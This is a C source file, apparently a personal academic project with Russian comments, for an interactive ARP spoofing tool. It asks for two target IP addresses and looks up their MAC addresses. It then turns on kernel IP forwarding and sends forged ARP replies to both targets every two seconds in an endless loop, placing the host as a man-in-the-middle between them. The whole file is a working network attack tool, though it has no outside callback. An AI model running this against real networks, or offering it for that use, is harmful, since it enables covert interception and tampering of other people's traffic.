// This is a personal academic project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: https://pvs-studio.com
#include <stdio.h>
#include <signal.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>

#include <unistd.h>
#include <arpa/inet.h>
#include <net/ethernet.h>

#include <netlib/transfer.h>
#include <netlib/packet.h>
#include <netlib/frame.h>
#include <netlib/arp.h>
#include <iflookup/iflookup.h>
#include <prettyterm/logo.h>

#define ARP_SPOOFING_COOLDOWN 2

void SIGINTHandler()
{
    printf("\n\n");
    debug("Exit from program ...");

    FILE* fd = fopen("/proc/sys/net/ipv4/ip_forward", "w");

    if (fd == NULL)
    {
        error("The program was unable to restore the ip forwardning value");
        exit(-1);
    }

    fputc('0', fd);
    fclose(fd);
    exit(0);
}

int main(int argc, char* argv[])
{
    prettytermPrintLogo();

    if (getuid() != 0)
    {
        error("The program must be started via root!");

        return -1;
    }

    size_t ifcount = getNICAmount();
    netifdata interfaces[ifcount];
    getInterfacesAddr(interfaces, ifcount);
    
    printf("Choose the network interface:\n");

    for (int i = 0; i < ifcount; i++)
    {
        printf("  %d) ", i + 1);
        
        if (interfaces[i].isActive == true) { printf("\033[1m\033[32m"); }
        if (interfaces[i].isActive == false) { printf("\033[31m"); }

        printf("%s", interfaces[i].devname);

        printf("\033[0m\n");
    }

    int interfaceChoice;
    
    printf("\nInterface (enter the digit): ");
    scanf("%d", &interfaceChoice);

    if (interfaceChoice > ifcount || interfaceChoice < 1)
    {
        error("Network interface with such ID does not exist\n");

        return -1;
    }

    if (interfaces[interfaceChoice - 1].isActive == false)
    {
        error("This network interface is inactive\n");

        return -1;
    }

    netifdata* interface = &interfaces[interfaceChoice - 1];

    char bobIPInputString[16];
    char aliceIPInputString[16];

    printf("IP address of Target #1: ");
    scanf("%15s", bobIPInputString);

    printf("IP address of Target #2: ");
    scanf("%15s", aliceIPInputString);
    
    in_addr_t bobIP = inet_addr(bobIPInputString);

    if (bobIP == INADDR_NONE)
    {
        error("The IP address entered does not exist: ");
        printf("%s\n", bobIPInputString);
        
        return -1;
    }

    in_addr_t aliceIP = inet_addr(aliceIPInputString);

    if (aliceIP == INADDR_NONE)
    {
        error("The IP address entered does not exist: ");
        printf("%s\n", aliceIPInputString);
        
        return -1;
    }
    
    uint8_t bobMAC[6];
    uint8_t aliceMAC[6];
    
    printf("\n");
    debug("Requesting MAC address of 1th target (bob) ...\n");
    debug("Requesting MAC address of 2th target (alice) ...\n");

    int status;

    status = makeNormalARPRequest(interface, bobMAC, bobIP);

    if (status == -1)
    {
        error("Target #1 does not respond to ARP request ");
        printf("(%s)\n", bobIPInputString);
        
        return -1;
    }

    status = makeNormalARPRequest(interface, aliceMAC, aliceIP);

    if (status == -1)
    {
        error("Target #2 does not respond to ARP request ");
        printf("(%s)\n", aliceIPInputString);
        
        return -1;
    }

    success("#1 ( bob ) MAC address: ");

    printf("\033[1m");  // Включение стиля жирного текста

    for (int i = 0; i < 6; i++)
    {
        printf("%02x", bobMAC[i]); if (i < 5) { printf(":"); }
    }
    
    printf("\033[0m");  // Выключение стиля жирного текста
    printf("\n");

    success("#2 (alice) MAC address: ");

    printf("\033[1m");  // Включение стиля жирного текста

    for (int i = 0; i < 6; i++)
    {
        printf("%02x", aliceMAC[i]); if (i < 5) { printf(":"); }
    }

    printf("\033[0m");  // Выключение стиля жирного текста
    printf("\n");

    signal(SIGINT, &SIGINTHandler);

    FILE* fd = fopen("/proc/sys/net/ipv4/ip_forward", "w");

    if (fd == NULL)
    {
        error("Failed to change value of /proc/sys/net/ipv4/ip_forward\n");

        return -1;
    }

    fputc('1', fd);
    fclose(fd);

    EthernetFrame bobFrame;
    memcpy(bobFrame.destination, bobMAC, 6);
    memcpy(bobFrame.source, interface->mac, 6);  // Можно ли поменять на MAC Алисы?
    bobFrame.etherType = htons(0x0806);

    ARPPacket bobARPPacket;
    bobARPPacket.senderIP = aliceIP;
    memcpy(bobARPPacket.senderMAC, interface->mac, 6);
    bobARPPacket.targetIP = bobIP;
    memcpy(bobARPPacket.targetMAC, bobMAC, 6);
    bobARPPacket.isReply = true;

    PACKET_D poisonForBob = createPacket();
    packARP(&poisonForBob, &bobARPPacket);
    packFrame(&poisonForBob, &bobFrame);

    EthernetFrame aliceFrame;
    memcpy(aliceFrame.destination, aliceMAC, 6);
    memcpy(aliceFrame.source, interface->mac, 6);
    aliceFrame.etherType = htons(0x0806);

    ARPPacket aliceARPPacket;
    aliceARPPacket.senderIP = bobIP;
    memcpy(aliceARPPacket.senderMAC, interface->mac, 6);
    aliceARPPacket.targetIP = aliceIP;
    memcpy(aliceARPPacket.targetMAC, aliceMAC, 6);
    aliceARPPacket.isReply = true;

    PACKET_D poisonForAlice = createPacket();
    packARP(&poisonForAlice, &aliceARPPacket);
    packFrame(&poisonForAlice, &aliceFrame);

    int sockfd = createAFPacketRawSocket(interface, ETH_P_ARP);

    // TODO: Нужно вынести это в отдельный поток
    while (1) {
        printf("sending...\n");
        sendFrame(sockfd, &poisonForBob);
        sendFrame(sockfd, &poisonForAlice);
        sleep(ARP_SPOOFING_COOLDOWN);
    }

    return 0;
}